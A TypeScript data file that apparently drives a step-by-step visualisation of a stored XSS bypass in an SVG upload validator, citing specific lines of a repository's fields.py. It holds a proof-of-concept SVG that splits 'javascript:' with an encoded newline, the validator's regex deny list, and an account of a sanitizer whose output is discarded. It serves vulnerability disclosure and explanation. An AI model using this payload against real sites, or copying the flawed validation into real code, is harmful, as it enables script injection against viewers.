export type Tone = "neutral" | "pass" | "bug" | "exec";

export type FlowStep = {
  id: string;
  label: string;
  tone: Tone;
  verdict: string;
  title: string;
  body: string;
  detailLabel?: string;
  detail?: string;
  detailLang?: string;
  code?: string;
  codeLang?: string;
  codeLabel?: string;
  cite?: string;
  citeHref?: string;
};

export const REPO_BLOB =
  "https://github.com/mozmeao/springfield/blob/92f299a7a3c57dc69c8c63a01e4d22e24f06042d/springfield/cms/fields.py";

export const STEPS: FlowStep[] = [
  {
    id: "payload",
    label: "Payload",
    tone: "neutral",
    verdict: "Raw bytes",
    title: "Encoded newline splits javascript:",
    body: "xlink:href stores &#x0a; (LF) between java and script as six literal bytes — no contiguous javascript: on disk.",
    detailLabel: "Byte-level href",
    detailLang: "text",
    detail: `chars:  j  a  v  a  &  #  x  0  a  ;  s  c  r  i  p  t  :
hex:   6a 61 76 61 26 23 78 30 61 3b 73 63 72 69 70 74 3a
       └──"java"──┘ └─── "&#x0a;" ───┘ └─"script:"─┘
b"javascript:" in file  →  absent`,
    codeLabel: "PoC · e.svg",
    codeLang: "xml",
    code: `<a xlink:href="java&#x0a;script:alert(document.domain)">
  <rect width="200" height="200" fill="red"/>
</a>`,
  },
  {
    id: "layer1",
    label: "Layer 1",
    tone: "pass",
    verdict: "Pass",
    title: "Regex on raw bytes",
    body: "re.search(..., IGNORECASE) on original_content — does not decode entities, so rb\"javascript:\" misses java&#x0a;script:.",
    detailLabel: "All patterns miss",
    detailLang: "text",
    detail: `rb"javascript:"  → None
rb"<script[\\s>]"   → None
input: ...java&#x0a;script:...`,
    codeLabel: "fields.py",
    codeLang: "python",
    code: `DANGEROUS_SVG_PATTERNS = [
    rb"<script[\\s>]", rb"javascript:",
    rb"on\\w+\\s*=", rb"<foreignObject",
    rb"data:text/html",
]
for pattern in DANGEROUS_SVG_PATTERNS:
    if re.search(pattern, content, re.I): return True`,
    cite: "L80–L86",
    citeHref: `${REPO_BLOB}#L80-L86`,
  },
  {
    id: "layer2",
    label: "Layer 2",
    tone: "pass",
    verdict: "Pass",
    title: "defusedxml + substring check",
    body: "Parser expands &#x0a; → \\n. Element a / attr href allowed. Substring guard still misses java\\nscript:.",
    detailLabel: "After decode",
    detailLang: "text",
    detail: `attr_value = "java\\nscript:alert(...)"
"javascript:" in value.lower() → False`,
    codeLabel: "fields.py",
    codeLang: "python",
    code: `if attr_value and "javascript:" in attr_value.lower():
    return True   # not taken`,
    cite: "L238–L240",
    citeHref: `${REPO_BLOB}#L238-L240`,
  },
  {
    id: "layer3",
    label: "Layer 3",
    tone: "bug",
    verdict: "Bypass",
    title: "filter_svg output discarded",
    body: "py-svg-hush neutralizes in memory. Return value never assigned — f keeps attacker bytes; returns None.",
    detailLabel: "Computed vs stored",
    detailLang: "text",
    detail: `filter_svg(...) → sanitized (dropped)
f.read() → original_content`,
    codeLabel: "fields.py · L273–L293",
    codeLang: "python",
    code: `# We don't reject based on changes - safety net only
try:
    filter_svg(original_content, ...)  # ignored
except (ValueError, ET.ParseError):
    return ValidationError(...)
return None  # no f.write(...)`,
    cite: "L273–L293",
    citeHref: `${REPO_BLOB}#L273-L293`,
  },
  {
    id: "execution",
    label: "Execution",
    tone: "exec",
    verdict: "XSS",
    title: "Stored → URL parser → javascript:",
    body: "Unchanged buffer served same-origin. WHATWG URL parser strips \\n on click → javascript: runs as viewer.",
    detailLabel: "Three forms",
    detailLang: "text",
    detail: `disk:    java&#x0a;script:...
decoded: java\\nscript:...
parsed:  javascript:...  ← runs`,
    codeLabel: "fields.py · to_python",
    codeLang: "python",
    code: `validation_error = self._sanitize_svg(f)  # None
return f  # original buffer unchanged

# click → javascript:alert(document.domain)`,
    cite: "L302–L321",
    citeHref: `${REPO_BLOB}#L302-L321`,
  },
];
